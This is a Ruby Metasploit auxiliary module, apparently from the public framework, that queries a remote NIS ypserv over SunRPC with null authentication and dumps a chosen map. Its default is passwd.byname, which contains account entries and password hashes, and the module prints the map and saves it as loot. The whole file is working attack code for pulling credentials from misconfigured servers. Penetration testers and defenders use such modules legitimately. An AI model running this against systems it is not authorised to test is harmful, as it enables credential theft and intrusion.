##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SunRPC
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NIS ypserv Map Dumper',
      'Description' => %q{
        This module dumps the specified map from NIS ypserv.

        The following examples are from ypcat -x:

        Use "ethers"    for map "ethers.byname"
        Use "aliases"   for map "mail.aliases"
        Use "services"  for map "services.byname"
        Use "protocols" for map "protocols.bynumber"
        Use "hosts"     for map "hosts.byname"
        Use "networks"  for map "networks.byaddr"
        Use "group"     for map "group.byname"
        Use "passwd"    for map "passwd.byname"

        You may specify a map by one of the nicknames above.
      },
      'Author'      => 'wvu',
      'References'  => [
        ['URL', 'https://tools.ietf.org/html/rfc1831'],
        ['URL', 'https://tools.ietf.org/html/rfc4506']
      ],
      'License'     => MSF_LICENSE
    ))

    register_options([
      OptEnum.new('PROTOCOL', [true, 'Protocol to use', 'tcp', %w[tcp udp]]),
      OptString.new('DOMAIN', [true, 'NIS domain']),
      OptString.new('MAP',    [true, 'NIS map to dump', 'passwd'])
    ])

    register_advanced_options([
      OptFloat.new('XDRTimeout', [true, 'XDR decoding timeout', 10.0])
    ])
  end

  def run
    proto    = datastore['PROTOCOL']
    domain   = datastore['DOMAIN']
    map_name = nick_to_map(datastore['MAP'])

    begin
      sunrpc_create(
        proto,  # Protocol: TCP (6)
        100004, # Program: YPSERV (100004)
        2       # Program Version: 2
      )
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Could not connect to portmapper')
    rescue Rex::Proto::SunRPC::RPCError
      fail_with(Failure::Unreachable, 'Could not connect to ypserv')
    end

    # Flavor: AUTH_NULL (0)
    sunrpc_authnull

    # XXX: domain and map_name are modified in place
    ypserv_all_call = Rex::Encoder::XDR.encode(
      domain,  # Domain: [redacted]
      map_name # Map Name: passwd.byname
    )

    begin
      res = sunrpc_call(
        8,              # Procedure: ALL (8)
        ypserv_all_call # Yellow Pages Service ALL call
      )
    rescue Rex::Proto::SunRPC::RPCError
      fail_with(Failure::NotFound, 'Could not call ypserv procedure')
    ensure
      # Shut it down! Shut it down forever!
      sunrpc_destroy
    end

    unless res && res.length > 8
      fail_with(Failure::UnexpectedReply, 'Invalid response from server')
      return
    end

    # XXX: Rex::Encoder::XDR doesn't do signed ints
    case res[4, 4].unpack('l>').first
    # Status: YP_NOMAP (-1)
    when -1
      fail_with(Failure::BadConfig, "Invalid map #{map_name} specified")
    # Status: YP_NODOM (-2)
    when -2
      fail_with(Failure::BadConfig, "Invalid domain #{domain} specified")
    end

    map = begin
      Timeout.timeout(datastore['XDRTimeout']) do
        parse_map(res)
      end
    rescue Timeout::Error
      fail_with(Failure::TimeoutExpired,
                'XDR decoding timed out (try increasing XDRTimeout?)')
      return
    end

    if map.blank?
      fail_with(Failure::Unknown, "Could not parse map #{map_name}")
      return
    end

    map_file = map.values.join("\n") + "\n"

    print_good("Dumping map #{map_name} on domain #{domain}:\n#{map_file}")

    # XXX: map_name contains null bytes if its length isn't a multiple of four
    store_loot(map_name.strip, 'text/plain', rhost, map_file)
  end

  def parse_map(res)
    map = {}

    loop do
      begin
        # XXX: res is modified in place
        _, status, value, key = Rex::Encoder::XDR.decode!(
          res,
          Integer, # More: Yes
          Integer, # Status: YP_TRUE (1)
          String,  # Value: [redacted]
          String   # Key: [redacted]
        )

        break unless status == 1 && key && value

        map[key] = value
      rescue Rex::ArgumentError
        vprint_status("Finished XDR decoding at #{res.inspect}")
        break
      end
    end

    map
  end

  # ypcat -x
  def nick_to_map(nick)
    {
      'ethers'    => 'ethers.byname',
      'aliases'   => 'mail.aliases',
      'services'  => 'services.byname',
      'protocols' => 'protocols.bynumber',
      'hosts'     => 'hosts.byname',
      'networks'  => 'networks.byaddr',
      'group'     => 'group.byname',
      'passwd'    => 'passwd.byname'
    }[nick] || nick
  end

end
